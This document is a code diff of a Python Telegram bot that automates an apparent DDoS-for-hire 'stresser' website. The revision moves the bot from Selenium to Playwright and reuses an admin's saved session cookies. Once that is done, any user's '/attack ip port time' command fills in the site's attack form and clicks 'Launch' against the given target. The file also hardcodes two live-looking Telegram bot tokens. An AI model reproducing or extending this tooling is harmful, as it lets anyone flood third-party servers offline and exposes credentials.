@@ -1,235 +1,234 @@
 import os
 import json
-import logging
+import asyncio
 import threading
 import time
-from datetime import datetime
-from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
-from selenium.webdriver.chrome.service import Service
-from webdriver_manager.chrome import ChromeDriverManager
-import asyncio
+from telegram import Update
+from telegram.ext import Application, CommandHandler, ContextTypes
+from playwright.async_api import async_playwright
 
 # ==================== CONFIG ====================
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
-logger = logging.getLogger(__name__)
-
-BOT_TOKEN = "8521144614:AAE-P7L4SKCMk5ZaggzU4jZmhmbMMBUhUJA"
-ADMIN_IDS = [7820814565]  # Sirf admin ID
-
-# Website details
+BOT_TOKEN = "8521144614:AAGOvjw0Y4vxgIYuYPOQoszyrdbgErIx_VE"
+ADMIN_IDS = [7820814565]  # Admin ID
+COOKIE_FILE = "session_cookies.json"
 WEBSITE_URL = "https://satellitestress.st/attack"
 LOGIN_URL = "https://satellitestress.st/login"
 
-# ==================== GLOBAL BROWSER (Admin login karega) ====================
-driver = None
-browser_ready = False
-browser_lock = threading.Lock()
+# ==================== GLOBAL VARIABLES ====================
+playwright = None
+browser = None
+context = None
+page = None
+cookies_loaded = False
 
-def init_browser():
-    """Browser initialize karo aur login page kholo"""
-    global driver, browser_ready
+# ==================== COOKIE FUNCTIONS ====================
+async def save_cookies(context):
+    """Save cookies to file"""
+    cookies = await context.cookies()
+    with open(COOKIE_FILE, 'w') as f:
+        json.dump(cookies, f)
+    print("✅ Cookies saved!")
+
+async def load_cookies(context):
+    """Load cookies from file"""
     try:
-        options = webdriver.ChromeOptions()
-        options.add_argument('--no-sandbox')
-        options.add_argument('--disable-dev-shm-usage')
-        # Headless mode nahi rakhte taaki admin login dekh sake
-        service = Service(ChromeDriverManager().install())
-        driver = webdriver.Chrome(service=service, options=options)
-        driver.get(LOGIN_URL)
-        print("="*50)
-        print("🔐 Browser opened. Please login manually in the browser window.")
-        print("After login, type /ready in bot to continue.")
-        print("="*50)
-        browser_ready = False  # Jab tak admin /ready na kare
+        with open(COOKIE_FILE, 'r') as f:
+            cookies = json.load(f)
+            await context.add_cookies(cookies)
+            print("✅ Cookies loaded!")
+            return True
+    except:
+        print("❌ No cookies found.")
+        return False
+
+# ==================== BROWSER SETUP ====================
+async def start_browser(headless=True):
+    """Start Playwright browser"""
+    global playwright, browser, context, page
+    playwright = await async_playwright().start()
+    browser = await playwright.chromium.launch(headless=headless)
+    context = await browser.new_context()
+    page = await context.new_page()
+    return page
+
+async def close_browser():
+    """Close browser"""
+    global playwright, browser, context, page
+    if browser:
+        await browser.close()
+    if playwright:
+        await playwright.stop()
+
+# ==================== LOGIN COMMAND (Admin only) ====================
+async def login(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Admin manually login karega - pehli baar"""
+    user_id = update.effective_user.id
+    if user_id not in ADMIN_IDS:
+        await update.message.reply_text("⛔ Admin only.")
+        return
+
+    await update.message.reply_text(
+        "🔄 **Starting browser for login...**\n"
+        "Please complete login in the opened browser window.\n"
+        "After login, type `/done` here."
+    )
+
+    # Browser open karo (headless=False so admin can see)
+    asyncio.create_task(do_login())
+
+async def do_login():
+    """Actual login process"""
+    global page, context
+    try:
+        page = await start_browser(headless=False)
+        await page.goto(LOGIN_URL)
+        # Browser open hai, admin login karega
     except Exception as e:
-        print(f"❌ Browser init error: {e}")
-        browser_ready = False
+        print(f"Login error: {e}")
 
-# Thread mein browser start karo
-threading.Thread(target=init_browser, daemon=True).start()
-
-# ==================== TELEGRAM COMMANDS ====================
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in ADMIN_IDS:
-        await update.message.reply_text("⛔ You are not authorized to use this bot.")
-        return
-    
-    await update.message.reply_text(
-        "🤖 **Admin Bot Started**\n\n"
-        "1. Browser automatically opened.\n"
-        "2. Login to the website manually.\n"
-        "3. After login, type /ready\n\n"
-        "Users can then use /attack command."
-    )
-
-async def ready(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Admin ne login kar liya - ab browser ready hai"""
-    global browser_ready
+async def done(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Admin ne login kar liya - cookies save karo"""
     user_id = update.effective_user.id
     if user_id not in ADMIN_IDS:
         return
-    
-    if driver is None:
-        await update.message.reply_text("❌ Browser not initialized. Restart bot.")
-        return
-    
-    browser_ready = True
-    await update.message.reply_text(
-        "✅ **Browser is ready!**\n\n"
-        "Users can now use:\n"
-        "`/attack <ip> <port> <time>`\n"
-        "Example: `/attack 1.1.1.1 80 60`"
-    )
 
+    global cookies_loaded, context
+    try:
+        await save_cookies(context)
+        cookies_loaded = True
+        await update.message.reply_text(
+            "✅ **Login successful! Cookies saved.**\n"
+            "Now users can use `/attack` command."
+        )
+        # Browser ko headless mode mein switch kar sakte ho ya close kar ke phir se headless open karo
+        asyncio.create_task(switch_to_headless())
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {e}")
+
+async def switch_to_headless():
+    """Browser ko headless mode mein restart karo attacks ke liye"""
+    global browser, context, page, cookies_loaded
+    await close_browser()
+    # Headless mode mein phir se start karo with saved cookies
+    page = await start_browser(headless=True)
+    cookies_loaded = await load_cookies(context)
+    if cookies_loaded:
+        print("✅ Headless browser ready with cookies.")
+
+# ==================== ATTACK COMMAND (All users) ====================
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """User attack command - browser reuse karega"""
-    global driver, browser_ready
-    
-    if not browser_ready or driver is None:
-        await update.message.reply_text("⏳ Bot is not ready yet. Admin is setting up...")
+    global cookies_loaded, page
+
+    if not cookies_loaded:
+        await update.message.reply_text("⏳ Bot not ready. Admin needs to login first.")
         return
-    
-    # Parse arguments
+
     args = context.args
     if len(args) != 3:
-        await update.message.reply_text(
-            "❌ Use: `/attack <ip> <port> <time>`\n"
-            "Example: `/attack 1.1.1.1 80 60`"
-        )
+        await update.message.reply_text("❌ Use: `/attack <ip> <port> <time>`")
         return
-    
+
     ip, port_str, time_str = args
-    
-    # Validate port
     try:
         port = int(port_str)
-        if port < 1 or port > 65535:
-            await update.message.reply_text("❌ Port must be 1-65535")
-            return
-    except:
-        await update.message.reply_text("❌ Invalid port")
-        return
-    
-    # Validate time
-    try:
         duration = int(time_str)
-        if duration < 10 or duration > 300:
-            await update.message.reply_text("❌ Time must be 10-300 seconds")
-            return
+        if port < 1 or port > 65535 or duration < 10 or duration > 300:
+            raise ValueError
     except:
-        await update.message.reply_text("❌ Invalid time")
+        await update.message.reply_text("❌ Invalid port or time.")
         return
-    
-    # Send initial message
-    msg = await update.message.reply_text(
-        f"🔄 **Launching attack...**\n"
-        f"Target: `{ip}:{port}`\n"
-        f"Duration: {duration}s"
-    )
-    
-    # Browser mein attack karo (alag thread mein taaki bot block na ho)
+
+    msg = await update.message.reply_text(f"🔄 Launching attack on `{ip}:{port}` for {duration}s...")
+
+    # Attack in background thread
     def attack_thread():
-        with browser_lock:
-            try:
-                # Current tab mein attack page open karo
-                driver.get(WEBSITE_URL)
-                wait = WebDriverWait(driver, 10)
-                
-                # Saare input fields dhundho
-                inputs = wait.until(EC.presence_of_all_elements_located((By.TAG_NAME, "input")))
-                
-                # Filter visible inputs
-                visible = []
-                for inp in inputs:
-                    if inp.is_displayed() and inp.get_attribute('type') != 'hidden':
-                        visible.append(inp)
-                
-                if len(visible) >= 3:
-                    # IP field
-                    visible[0].clear()
-                    visible[0].send_keys(ip)
-                    
-                    # Port field
-                    visible[1].clear()
-                    visible[1].send_keys(str(port))
-                    
-                    # Time field
-                    visible[2].clear()
-                    visible[2].send_keys(str(duration))
-                    
-                    # Launch button dhundho
-                    buttons = driver.find_elements(By.TAG_NAME, "button")
-                    launch_btn = None
-                    for btn in buttons:
-                        if "Launch" in btn.text:
-                            launch_btn = btn
-                            break
-                    
-                    if launch_btn:
-                        launch_btn.click()
-                        time.sleep(2)
-                        
-                        # Send success message
-                        async def send_success():
-                            await context.bot.send_message(
-                                chat_id=update.effective_chat.id,
-                                text=f"✅ **Attack launched!**\n\n`{ip}:{port}` for {duration}s"
-                            )
-                        asyncio.run_coroutine_threadsafe(send_success(), asyncio.get_event_loop())
-                    else:
-                        async def send_error():
-                            await context.bot.send_message(
-                                chat_id=update.effective_chat.id,
-                                text="❌ Launch button not found"
-                            )
-                        asyncio.run_coroutine_threadsafe(send_error(), asyncio.get_event_loop())
-                else:
-                    async def send_error():
-                        await context.bot.send_message(
-                            chat_id=update.effective_chat.id,
-                            text=f"❌ Only {len(visible)} inputs found"
-                        )
-                    asyncio.run_coroutine_threadsafe(send_error(), asyncio.get_event_loop())
-                    
-            except Exception as e:
-                async def send_error():
-                    await context.bot.send_message(
-                        chat_id=update.effective_chat.id,
-                        text=f"❌ Attack error: {str(e)}"
-                    )
-                asyncio.run_coroutine_threadsafe(send_error(), asyncio.get_event_loop())
-    
+        try:
+            # asyncio.run() use karo ya existing loop
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            loop.run_until_complete(perform_attack(ip, port, duration, update, context))
+        except Exception as e:
+            loop.run_until_complete(context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=f"❌ Attack failed: {e}"
+            ))
+
     threading.Thread(target=attack_thread).start()
 
+async def perform_attack(ip, port, duration, update, context):
+    """Actual attack using existing page with cookies"""
+    global page
+    try:
+        # Attack page par jao
+        await page.goto(WEBSITE_URL, wait_until='networkidle')
+        await page.wait_for_timeout(2000)
+
+        # Input fields find karo
+        inputs = await page.query_selector_all('input[type="text"]')
+        visible = []
+        for inp in inputs:
+            if await inp.is_visible():
+                visible.append(inp)
+
+        if len(visible) >= 3:
+            await visible[0].fill('')
+            await visible[0].fill(ip)
+            await visible[1].fill('')
+            await visible[1].fill(str(port))
+            await visible[2].fill('')
+            await visible[2].fill(str(duration))
+
+            # Launch button click
+            launch_btn = await page.query_selector('button:has-text("Launch")')
+            if launch_btn:
+                await launch_btn.click()
+                await page.wait_for_timeout(2000)
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=f"✅ **Attack launched!**\n`{ip}:{port}` for {duration}s"
+                )
+            else:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text="❌ Launch button not found."
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=f"❌ Only {len(visible)} input fields found."
+            )
+    except Exception as e:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=f"❌ Attack error: {e}"
+        )
+
+# ==================== STATUS COMMAND ====================
 async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Check browser status"""
-    if browser_ready:
-        await update.message.reply_text("✅ Browser is ready. Attack can be launched.")
+    if cookies_loaded:
+        await update.message.reply_text("✅ Bot is ready. Cookies loaded.")
     else:
-        await update.message.reply_text("⏳ Browser is not ready yet. Admin is logging in.")
+        await update.message.reply_text("⏳ Bot not ready. Admin needs to /login first.")
 
 # ==================== MAIN ====================
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
-    
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("ready", ready))
+
+    app.add_handler(CommandHandler("start", status))  # /start se status dikhao
+    app.add_handler(CommandHandler("login", login))
+    app.add_handler(CommandHandler("done", done))
     app.add_handler(CommandHandler("attack", attack))
     app.add_handler(CommandHandler("status", status))
-    
+
     print("="*50)
-    print("🤖 SELENIUM BOT STARTED")
+    print("🤖 PLAYWRIGHT COOKIE BOT")
     print("="*50)
-    print("👑 Admin only: /start, /ready")
-    print("👥 Users: /attack ip port time")
+    print("Admin: /login (first time only)")
+    print("After login, type /done")
+    print("Users: /attack ip port time")
     print("="*50)
-    
+
     app.run_polling()
 
 if __name__ == "__main__":
